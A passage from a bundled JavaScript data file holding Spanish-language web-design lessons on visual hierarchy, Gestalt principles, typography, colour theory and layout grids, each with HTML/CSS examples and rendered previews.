`,completed:!1,isProject:!0}]},j1={id:"visual-architecture",title:"Arquitectura Visual y Esttica Web Profesional",description:"Aprende los principios universales del diseo visual para construir interfaces coherentes, modernas y estratgicas.",completed:!1,lessons:[{id:"visual-arch-1-1-principios-visuales",title:"1.1 Principios visuales y Leyes de Gestalt",level:"junior",content:`# 1.1 Principios visuales y Leyes de Gestalt

## La base del Criterio Visual

Disear no es "hacer que se vea bonito". Disear es **comunicar visualmente con intencin**. Para lograrlo, existen reglas fundamentales que el ojo humano sigue para procesar la informacin.

### 1. Jerarqua Visual
Es el orden en el que el usuario lee el contenido. Sin jerarqua, el usuario se siente abrumado.
*   **Tamao:** Lo ms grande atrae la vista primero.
*   **Color/Contraste:** Los colores vibrantes o contrastados "saltan" a la vista.
*   **Peso:** Las negritas pesan ms que el texto fino.
*   **Espacio Negativo:** Lo que est ms aislado llama ms la atencin.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Jerarqua Tipogrfica (Card Content)
Uso de pesos y colores para guiar el ojo sin necesidad de tamaos gigantes.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background: #1a1a1a; padding: 2rem; border-radius: 12px; border: 1px solid #333; max-width: 300px; font-family: sans-serif;">
    <div style="font-size: 0.75rem; color: #10b981; font-weight: 800; letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 0.5rem;">Prximo Evento</div>
    <div style="font-size: 1.5rem; color: #fff; font-weight: 900; margin-bottom: 0.75rem;">Masterclass: Arquitectura Visual</div>
    <div style="font-size: 0.9rem; color: #999; line-height: 1.6;">Aprende los secretos de los diseadores de FAANG para crear apps premium.</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.card-title { font-size: 1.25rem; font-weight: 700; color: #fff; }
.card-subtitle { font-size: 0.875rem; color: var(--primary); font-weight: 500; }
.card-body { font-size: 1rem; color: #888; line-height: 1.5; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Jerarqua</summary>
<div class="preview-box">
<div style="background: #1a1a1a; padding: 2rem; border-radius: 12px; border: 1px solid #333; max-width: 300px; font-family: sans-serif;">
    <div style="font-size: 0.75rem; color: #10b981; font-weight: 800; letter-spacing: 0.1em; text-transform: uppercase; margin-bottom: 0.5rem;">Prximo Evento</div>
    <div style="font-size: 1.5rem; color: #fff; font-weight: 900; margin-bottom: 0.75rem;">Masterclass: Arquitectura Visual</div>
    <div style="font-size: 0.9rem; color: #999; line-height: 1.6;">Aprende los secretos de los diseadores de FAANG para crear apps premium.</div>
  </div>
</div>
</details>

### Ejemplo 2: Ley de Proximidad (Form Layout)
Agrupar elementos relacionados reduce la carga cognitiva del usuario.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width: 100%; max-width: 350px; font-family: sans-serif; color: #fff;">
    <div style="margin-bottom: 1.5rem;">
      <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #10b981; margin-bottom: 0.4rem;">CORREO ELECTRNICO</label>
      <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; border: 1px solid #333; color: #666;">octavio@progravio.com</div>
    </div>
    <div style="margin-bottom: 1.5rem;">
      <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #10b981; margin-bottom: 0.4rem;">CONTRASEA</label>
      <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; border: 1px solid #333; color: #666;"></div>
    </div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.form-group { margin-bottom: 1.5rem; }
.label { display: block; margin-bottom: 0.25rem; font-weight: 600; }
.input { width: 100%; padding: 0.75rem; background: #222; border: 1px solid #444; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Proximidad</summary>
<div class="preview-box">
<div style="width: 100%; max-width: 350px; font-family: sans-serif; color: #fff;">
    <div style="margin-bottom: 1.5rem;">
      <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #10b981; margin-bottom: 0.4rem;">CORREO ELECTRNICO</label>
      <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; border: 1px solid #333; color: #666;">octavio@progravio.com</div>
    </div>
    <div style="margin-bottom: 1.5rem;">
      <label style="display: block; font-size: 0.8rem; font-weight: 700; color: #10b981; margin-bottom: 0.4rem;">CONTRASEA</label>
      <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; border: 1px solid #333; color: #666;"></div>
    </div>
  </div>
</div>
</details>

### Ejemplo 3: Contraste de Color (Call to Action)
El color no es decoracin, es un imn para la atencin.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; gap:15px; background:#111; padding:2rem; border-radius:12px;">
    <button style="background:#222; color:#fff; border:1px solid #333; padding:12px 24px; border-radius:8px; font-weight:bold; cursor:pointer;">Cancelar</button>
    <button style="background:#10b981; color:#000; border:none; padding:12px 24px; border-radius:8px; font-weight:bold; cursor:pointer; box-shadow:0 0 20px rgba(16,185,129,0.3);">Confirmar Envo</button>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.btn-primary { background: #10b981; color: #000; font-weight: 800; border: none; }
.btn-secondary { background: #222; color: #fff; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Contraste CTA</summary>
<div class="preview-box">
<div style="display:flex; gap:15px; background:#111; padding:2rem; border-radius:12px;">
    <button style="background:#222; color:#fff; border:1px solid #333; padding:12px 24px; border-radius:8px; font-weight:bold; cursor:pointer;">Cancelar</button>
    <button style="background:#10b981; color:#000; border:none; padding:12px 24px; border-radius:8px; font-weight:bold; cursor:pointer; box-shadow:0 0 20px rgba(16,185,129,0.3);">Confirmar Envo</button>
  </div>
</div>
</details>

### Ejemplo 4: Repeticin y Ritmo (Navigation Patterns)
La repeticin de elementos crea una sensacin de estructura y unidad.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; flex-direction:column; gap:8px; background:#111; padding:1rem; border-radius:8px; width:200px;">
    <div style="padding:10px; background:rgba(16,185,129,0.2); color:#10b981; border-radius:4px; font-family:sans-serif; font-weight:bold; font-size:0.8rem;"> DASHBOARD</div>
    <div style="padding:10px; color:#666; font-family:sans-serif; font-size:0.8rem;"> ANALYTICS</div>
    <div style="padding:10px; color:#666; font-family:sans-serif; font-size:0.8rem;"> PROJECTS</div>
    <div style="padding:10px; color:#666; font-family:sans-serif; font-size:0.8rem;"> SETTINGS</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.nav-item { padding: 8px 16px; border-radius: 4px; transition: 0.2s; }
.nav-item:hover { background: rgba(16, 185, 129, 0.1); }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Ritmo Visual</summary>
<div class="preview-box">
<div style="display:flex; flex-direction:column; gap:8px; background:#111; padding:1rem; border-radius:8px; width:200px;">
    <div style="padding:10px; background:rgba(16,185,129,0.2); color:#10b981; border-radius:4px; font-family:sans-serif; font-weight:bold; font-size:0.8rem;"> DASHBOARD</div>
    <div style="padding:10px; color:#666; font-family:sans-serif; font-size:0.8rem;"> ANALYTICS</div>
    <div style="padding:10px; color:#666; font-family:sans-serif; font-size:0.8rem;"> PROJECTS</div>
    <div style="padding:10px; color:#666; font-family:sans-serif; font-size:0.8rem;"> SETTINGS</div>
  </div>
</div>
</details>

### Ejemplo 5: Ley de Cierre (Minimalist Icons)
El cerebro completa las formas faltantes, permitiendo diseos extremadamente limpios.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="position:relative; width:80px; height:80px; border: 4px solid #333; border-radius:50%; display:flex; align-items:center; justify-content:center;">
    <div style="position:absolute; top:-12px; background:#0a0a0a; padding:0 8px; color:#10b981; font-weight:bold; font-size:0.6rem; font-family:sans-serif; letter-spacing:2px;">LOADING</div>
    <div style="width:10px; height:10px; background:#10b981; border-radius:50%; animation: pulse 2s infinite;"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  position:relative;
  width:80px;
  height:80px;
  border: 4px solid #333;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Ley de Cierre</summary>
<div class="preview-box">
<div style="position:relative; width:80px; height:80px; border: 4px solid #333; border-radius:50%; display:flex; align-items:center; justify-content:center;">
    <div style="position:absolute; top:-12px; background:#0a0a0a; padding:0 8px; color:#10b981; font-weight:bold; font-size:0.6rem; font-family:sans-serif; letter-spacing:2px;">LOADING</div>
    <div style="width:10px; height:10px; background:#10b981; border-radius:50%; animation: pulse 2s infinite;"></div>
  </div>
</div>
</details>


`,completed:!1},{id:"visual-arch-1-2-tipografia",title:"1.2 Tipografa y Legibilidad",level:"junior",content:`# 1.2 Tipografa y Legibilidad

La tipografa es la voz de tu interfaz. Una mala eleccin puede arruinar la experiencia de usuario.

### 1. Serif vs Sans-serif
*   **Serif:** Tradicin, elegancia, autoridad.
*   **Sans-serif:** Modernidad, limpieza, tecnologa.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Escala Tipogrfica Fluida
Uso de \`clamp()\` para que el texto sea perfecto tanto en mviles como en monitores 4K.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="text-align: center; max-width: 600px; font-family: sans-serif;">
    <h1 style="font-size: 2.5rem; font-weight: 900; color: #fff; line-height: 1.1; letter-spacing: -0.05em; margin: 0;">ESCRIBE CON CLARIDAD</h1>
    <p style="color: #888; margin-top: 1rem; font-size: 1.1rem;">La legibilidad no es opcional. Si el usuario no puede leer tu mensaje, tu diseo ha fallado.</p>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
h1 { font-size: clamp(2rem, 5vw + 1rem, 4.5rem); line-height: 1.1; }
p { font-size: clamp(1rem, 1vw + 0.5rem, 1.25rem); line-height: 1.6; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Tipografa Fluida</summary>
<div class="preview-box">
<div style="text-align: center; max-width: 600px; font-family: sans-serif;">
    <h1 style="font-size: 2.5rem; font-weight: 900; color: #fff; line-height: 1.1; letter-spacing: -0.05em; margin: 0;">ESCRIBE CON CLARIDAD</h1>
    <p style="color: #888; margin-top: 1rem; font-size: 1.1rem;">La legibilidad no es opcional. Si el usuario no puede leer tu mensaje, tu diseo ha fallado.</p>
  </div>
</div>
</details>

### Ejemplo 2: Mezcla de Fuentes (Font Pairing)
Combinar una fuente Serif para impacto y una Sans para lectura.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="max-width: 400px; background: #fff; padding: 3rem; border-radius: 4px; box-shadow: 0 30px 60px rgba(0,0,0,0.5);">
    <h3 style="font-family: serif; font-size: 2.5rem; color: #111; font-style: italic; margin-bottom: 1rem; border-bottom: 1px solid #eee; padding-bottom: 1rem;">Vintage</h3>
    <p style="font-family: sans-serif; font-size: 0.9rem; color: #666; line-height: 1.7; letter-spacing: 0.02em;">Un toque de elegancia clsica mezclado con la eficiencia de los sistemas modernos.</p>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.title-serif { font-family: 'Playfair Display', serif; font-style: italic; font-size: 3rem; }
.body-sans { font-family: 'Inter', sans-serif; font-size: 1rem; color: #444; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Font Pairing</summary>
<div class="preview-box">
<div style="max-width: 400px; background: #fff; padding: 3rem; border-radius: 4px; box-shadow: 0 30px 60px rgba(0,0,0,0.5);">
    <h3 style="font-family: serif; font-size: 2.5rem; color: #111; font-style: italic; margin-bottom: 1rem; border-bottom: 1px solid #eee; padding-bottom: 1rem;">Vintage</h3>
    <p style="font-family: sans-serif; font-size: 0.9rem; color: #666; line-height: 1.7; letter-spacing: 0.02em;">Un toque de elegancia clsica mezclado con la eficiencia de los sistemas modernos.</p>
  </div>
</div>
</details>

### Ejemplo 3: Letter Spacing (Tracking)
Ajustar el espacio entre letras para mejorar la legibilidad o el impacto.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="text-align:center;">
    <div style="color:#10b981; font-family:sans-serif; font-size:0.7rem; font-weight:900; letter-spacing:0.3em; margin-bottom:0.5rem;">CARRERA PROFESIONAL</div>
    <div style="color:#fff; font-family:sans-serif; font-size:2rem; font-weight:900;">FULLSTACK ARCHITECT</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.uppercase-tracking { text-transform: uppercase; letter-spacing: 0.15em; font-weight: 700; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Tracking</summary>
<div class="preview-box">
<div style="text-align:center;">
    <div style="color:#10b981; font-family:sans-serif; font-size:0.7rem; font-weight:900; letter-spacing:0.3em; margin-bottom:0.5rem;">CARRERA PROFESIONAL</div>
    <div style="color:#fff; font-family:sans-serif; font-size:2rem; font-weight:900;">FULLSTACK ARCHITECT</div>
  </div>
</div>
</details>

### Ejemplo 4: Tipografa Manuscrita para Acentos
El uso de fuentes "script" o manuscritas para romper la rigidez de una interfaz tech.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="font-family:sans-serif; color:#fff; line-height:0.9; text-align:center;">
    <div style="font-weight:900; font-size:4rem; letter-spacing:-2px;">ULTRA</div>
    <div style="font-weight:100; font-size:3.5rem; opacity:0.4; letter-spacing:10px; margin-top:5px;">LIGHT</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  flex-direction:column;
  align-items:center;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Accented Serif</summary>
<div class="preview-box" style="flex-direction:column; align-items:center;">
  <div style="font-family:serif; font-size:2rem; color:#fff; font-style:italic;">Design with</div>
  <div style="font-family:cursive, serif; font-size:3.5rem; color:#10b981; margin-top:-15px; transform:rotate(-5deg); font-weight:bold;">soul</div>
</div>
</details>

### Ejemplo 5: Contraste de Peso Extremo
Combinar una fuente Extra-Bold con una Ultra-Light para un look editorial moderno.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  font-family:sans-serif;
  color:#fff;
  line-height:0.9;
  text-align:center;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Weight Contrast</summary>
<div class="preview-box">
<div style="font-family:sans-serif; color:#fff; line-height:0.9; text-align:center;">
    <div style="font-weight:900; font-size:4rem; letter-spacing:-2px;">ULTRA</div>
    <div style="font-weight:100; font-size:3.5rem; opacity:0.4; letter-spacing:10px; margin-top:5px;">LIGHT</div>
  </div>
</div>
</details>


`,completed:!1},{id:"visual-arch-1-3-color",title:"1.3 Teora y Psicologa del Color",level:"junior",content:`# 1.3 Teora y Psicologa del Color

El color evoca emociones instantneas antes de leer una sola palabra.

### 1. Psicologa Bsica
*   **Azul:** Confianza, seguridad, tecnologa.
*   **Verde:** Salud, crecimiento, dinero (o xito).
*   **Rojo:** Urgencia, peligro, pasin.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Armona Monocromtica (Dashboard)
Usar un solo color con diferentes niveles de intensidad crea una interfaz limpia y sofisticada.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display: flex; gap: 10px; font-family: sans-serif;">
    <div style="width: 80px; height: 80px; background: #065f46; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">900</div>
    <div style="width: 80px; height: 80px; background: #10b981; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">500</div>
    <div style="width: 80px; height: 80px; background: #6ee7b7; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #065f46; font-weight: bold;">300</div>
    <div style="width: 80px; height: 80px; background: #d1fae5; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #065f46; font-weight: bold;">100</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
:root {
  --primary: #10b981;
  --primary-light: #d1fae5;
  --primary-dark: #065f46;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Monocroma</summary>
<div class="preview-box">
<div style="display: flex; gap: 10px; font-family: sans-serif;">
    <div style="width: 80px; height: 80px; background: #065f46; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">900</div>
    <div style="width: 80px; height: 80px; background: #10b981; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">500</div>
    <div style="width: 80px; height: 80px; background: #6ee7b7; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #065f46; font-weight: bold;">300</div>
    <div style="width: 80px; height: 80px; background: #d1fae5; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #065f46; font-weight: bold;">100</div>
  </div>
</div>
</details>

### Ejemplo 2: Contraste Accesible (Buttons)
Asegurar que el texto sea legible sobre el color de fondo elegido.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display: flex; gap: 20px;">
    <button style="background: #10b981; color: rgba(255,255,255,0.4); padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold;">POCO CONTRASTE</button>
    <button style="background: #10b981; color: #000; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 14px rgba(16, 185, 129, 0.4);">BUEN CONTRASTE</button>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.btn-success { background: #10b981; color: #000; } /* Mal contraste si el texto es blanco */
.btn-success-fix { background: #065f46; color: #fff; } /* Buen contraste */
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Contraste</summary>
<div class="preview-box">
<div style="display: flex; gap: 20px;">
    <button style="background: #10b981; color: rgba(255,255,255,0.4); padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold;">POCO CONTRASTE</button>
    <button style="background: #10b981; color: #000; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 14px rgba(16, 185, 129, 0.4);">BUEN CONTRASTE</button>
  </div>
</div>
</details>

### Ejemplo 3: Gradientes de Marca (Brand Glow)
Uso de degradados suaves para dar profundidad y modernidad.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background: linear-gradient(135deg, #10b981 0%, #3b82f6 100%); padding:2rem; border-radius:20px; color:#fff; font-family:sans-serif; width:250px; text-align:center; box-shadow: 0 20px 40px rgba(16, 185, 129, 0.2);">
    <div style="font-size:1.2rem; font-weight:900;">Premium Access</div>
    <p style="font-size:0.8rem; opacity:0.8; margin-top:10px;">Desbloquea todo el potencial de la plataforma.</p>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.glow-card { background: linear-gradient(135deg, #10b981 0%, #3b82f6 100%); color: white; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Brand Glow</summary>
<div class="preview-box">
<div style="background: linear-gradient(135deg, #10b981 0%, #3b82f6 100%); padding:2rem; border-radius:20px; color:#fff; font-family:sans-serif; width:250px; text-align:center; box-shadow: 0 20px 40px rgba(16, 185, 129, 0.2);">
    <div style="font-size:1.2rem; font-weight:900;">Premium Access</div>
    <p style="font-size:0.8rem; opacity:0.8; margin-top:10px;">Desbloquea todo el potencial de la plataforma.</p>
  </div>
</div>
</details>

### Ejemplo 4: Colores de Estado (UX Semantics)
El color como lenguaje funcional: Error, Advertencia, xito.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; gap:10px; flex-wrap:wrap; justify-content:center;">
    <div style="background:rgba(239, 68, 68, 0.1); color:#ef4444; padding:8px 16px; border-radius:6px; font-weight:bold; font-size:0.7rem; border:1px solid rgba(239, 68, 68, 0.2);">CRITICAL ERROR</div>
    <div style="background:rgba(245, 158, 11, 0.1); color:#f59e0b; padding:8px 16px; border-radius:6px; font-weight:bold; font-size:0.7rem; border:1px solid rgba(245, 158, 11, 0.2);">WARNING</div>
    <div style="background:rgba(16, 185, 129, 0.1); color:#10b981; padding:8px 16px; border-radius:6px; font-weight:bold; font-size:0.7rem; border:1px solid rgba(16, 185, 129, 0.2);">SUCCESS</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  display:flex;
  gap:10px;
  flex-wrap:wrap;
  justify-content:center;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Semantic Colors</summary>
<div class="preview-box">
<div style="display:flex; gap:10px; flex-wrap:wrap; justify-content:center;">
    <div style="background:rgba(239, 68, 68, 0.1); color:#ef4444; padding:8px 16px; border-radius:6px; font-weight:bold; font-size:0.7rem; border:1px solid rgba(239, 68, 68, 0.2);">CRITICAL ERROR</div>
    <div style="background:rgba(245, 158, 11, 0.1); color:#f59e0b; padding:8px 16px; border-radius:6px; font-weight:bold; font-size:0.7rem; border:1px solid rgba(245, 158, 11, 0.2);">WARNING</div>
    <div style="background:rgba(16, 185, 129, 0.1); color:#10b981; padding:8px 16px; border-radius:6px; font-weight:bold; font-size:0.7rem; border:1px solid rgba(16, 185, 129, 0.2);">SUCCESS</div>
  </div>
</div>
</details>

### Ejemplo 5: Glassmorphism Depth
Uso del color translcido para capas de informacin.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 400px; height: 250px; font-family: sans-serif; font-weight: bold;">
    <div style="grid-column: span 2; background: rgba(16, 185, 129, 0.2); border: 2px solid #10b981; border-radius: 12px; color: #10b981; display: flex; align-items: center; justify-content: center;">Main Feature</div>
    <div style="background: rgba(16, 185, 129, 0.1); border: 2px solid #10b981; border-radius: 12px; color: #10b981; display: flex; align-items: center; justify-content: center;">Side</div>
    <div style="background: rgba(16, 185, 129, 0.1); border: 2px solid #10b981; border-radius: 12px; color: #10b981; display: flex; align-items: center; justify-content: center;">Mini</div>
    <div style="grid-column: span 2; background: rgba(16, 185, 129, 0.05); border: 2px solid #10b981; border-radius: 12px; color: #10b981; display: flex; align-items: center; justify-content: center;">Footer Info</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background: linear-gradient(45deg, #0f172a, #1e3a8a);
  overflow:hidden;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Glass Depth</summary>
<div class="preview-box" style="background: linear-gradient(45deg, #0f172a, #1e3a8a); overflow:hidden;">
  <div style="width:120px; height:120px; background:#10b981; border-radius:50%; filter:blur(50px); opacity:0.3; position:absolute; top:20%; left:20%;"></div>
  <div style="background: rgba(255,255,255,0.03); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); padding:2.5rem; border-radius:24px; border:1px solid rgba(255,255,255,0.1); color:#fff; position:relative; z-index:2; text-align:center;">
    <div style="font-weight:900; letter-spacing:2px; font-size:0.8rem;">FUTURISTIC</div>
    <div style="font-size:0.6rem; opacity:0.5; margin-top:5px;">INTERFACE LAYER</div>
  </div>
</div>
</details>


`,completed:!1},{id:"visual-arch-1-4-espaciado-layout",title:"1.4 Espaciado, Grids y Layout",level:"junior",content:`# 1.4 Espaciado, Grids y Layout

El espaciado es el "oxgeno" de tu diseo. Sin espacio, no hay claridad.

### 1. El Sistema de 8px
Todas las medidas deben ser mltiplos de 8 (8, 16, 24, 32, 48...). Crea un ritmo visual predecible.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Grid de Bento Box
Un estilo moderno de organizar contenido asimtrico pero equilibrado.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.bento-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 20px;
}
.item-1 { grid-column: span 2; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Bento Grid</summary>
<div class="preview-box">
<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 400px; height: 250px; font-family: sans-serif; font-weight: bold;">
    <div style="grid-column: span 2; background: rgba(16, 185, 129, 0.2); border: 2px solid #10b981; border-radius: 12px; color: #10b981; display: flex; align-items: center; justify-content: center;">Main Feature</div>
    <div style="background: rgba(16, 185, 129, 0.1); border: 2px solid #10b981; border-radius: 12px; color: #10b981; display: flex; align-items: center; justify-content: center;">Side</div>
    <div style="background: rgba(16, 185, 129, 0.1); border: 2px solid #10b981; border-radius: 12px; color: #10b981; display: flex; align-items: center; justify-content: center;">Mini</div>
    <div style="grid-column: span 2; background: rgba(16, 185, 129, 0.05); border: 2px solid #10b981; border-radius: 12px; color: #10b981; display: flex; align-items: center; justify-content: center;">Footer Info</div>
  </div>
</div>
</details>

### Ejemplo 2: Centrado Perfecto (Auto-margin vs Flex)
Dos formas de lograr el centrado, dependiendo de la necesidad.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width: 100%; border: 1px dashed #444; height: 150px; display: flex; align-items: center; justify-content: center;">
    <div style="background: #10b981; color: #000; padding: 10px 20px; border-radius: 4px; font-weight: bold;">CENTRO ABSOLUTO</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.center-flex { display: flex; justify-content: center; align-items: center; }
.center-margin { margin: 0 auto; max-width: 500px; }
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Centrado</summary>
<div class="preview-box">
<div style="width: 100%; border: 1px dashed #444; height: 150px; display: flex; align-items: center; justify-content: center;">
    <div style="background: #10b981; color: #000; padding: 10px 20px; border-radius: 4px; font-weight: bold;">CENTRO ABSOLUTO</div>
  </div>
</div>
</details>

### Ejemplo 3: Espaciado "Aireado" (White Space)
El lujo en el diseo se mide por la cantidad de espacio que dejas respirar al contenido.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; gap:10px; width:280px;">
    <div style="flex:1; display:flex; flex-direction:column; gap:10px;">
      <div style="background:rgba(255,255,255,0.05); height:140px; border-radius:12px; border:1px solid #333;"></div>
      <div style="background:#10b981; height:80px; border-radius:12px;"></div>
    </div>
    <div style="flex:1; display:flex; flex-direction:column; gap:10px;">
      <div style="background:#10b981; height:70px; border-radius:12px;"></div>
      <div style="background:rgba(255,255,255,0.05); height:150px; border-radius:12px; border:1px solid #333;"></div>
    </div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.luxury-spacing { padding: 5rem 2rem; border: 1px solid #333; }
\`\`\`

</details>


<details class="preview-details">
<summary class="preview-summary">Ver Resultado: White Space Luxe</summary>
<div class="preview-box" style="background:#000; border-radius:12px;">
  <div style="border:1px solid #222; padding:4rem; text-align:center; color:#fff; font-family:serif; letter-spacing:5px;">
    <div style="font-weight:100; opacity:0.5; font-size:0.8rem;">ESTABLISHED</div>
    <div style="font-size:2rem; margin-top:1rem; font-weight:900;">1984</div>
  </div>
</div>
</details>

### Ejemplo 4: El Tringulo de Oro (Hero Layout)
Posicionar los elementos clave para guiar el ojo hacia la accin principal.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#111;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Focal Point</summary>
<div class="preview-box" style="background:#111; border-radius:12px;">
  <div style="width:100%; height:200px; position:relative; border:1px dashed #333; overflow:hidden;">
    <div style="position:absolute; top:30px; left:30px; width:40%; height:10px; background:#333; border-radius:5px;"></div>
    <div style="position:absolute; top:50px; left:30px; width:60%; height:10px; background:#333; border-radius:5px;"></div>
    <div style="position:absolute; bottom:30px; right:30px; padding:10px 25px; background:#10b981; color:black; font-weight:bold; border-radius:8px; font-size:0.8rem;">ACTION</div>
  </div>
</div>
</details>

### Ejemplo 5: Grid de "Mampostera" (Masonry)
Layout dinmico para feeds creativos que rompen el grid tradicional.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  display:flex;
  gap:10px;
  width:280px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Masonry Grid</summary>
<div class="preview-box">
<div style="display:flex; gap:10px; width:280px;">
    <div style="flex:1; display:flex; flex-direction:column; gap:10px;">
      <div style="background:rgba(255,255,255,0.05); height:140px; border-radius:12px; border:1px solid #333;"></div>
      <div style="background:#10b981; height:80px; border-radius:12px;"></div>
    </div>
    <div style="flex:1; display:flex; flex-direction:column; gap:10px;">
      <div style="background:#10b981; height:70px; border-radius:12px;"></div>
      <div style="background:rgba(255,255,255,0.05); height:150px; border-radius:12px; border:1px solid #333;"></div>
    </div>
  </div>
</div>
</details>


